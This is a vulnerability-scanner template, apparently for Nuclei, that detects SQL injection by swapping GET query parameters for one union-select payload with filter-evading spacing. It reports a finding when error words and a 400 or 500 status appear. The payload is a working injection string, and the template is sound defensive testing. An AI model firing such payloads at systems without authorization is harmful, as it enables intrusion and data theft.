id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL injection vulnerabilities using a specific payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "-1\\' and .0union+distinct+select+1+--+"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "error"  # This can be adjusted based on expected error messages from the application
          - "mysql"  # Including database errors as potential indicators for SQL Injection
          - "syntax"  # Additional indicators
          
      - type: status
        status:
          - 500   # Check for server errors commonly returned on SQL Injection
          - 400   # Bad request might indicate an error as well

      - type: word
        part: header
        words:
          - "text/html"  # To ensure the response is an HTML page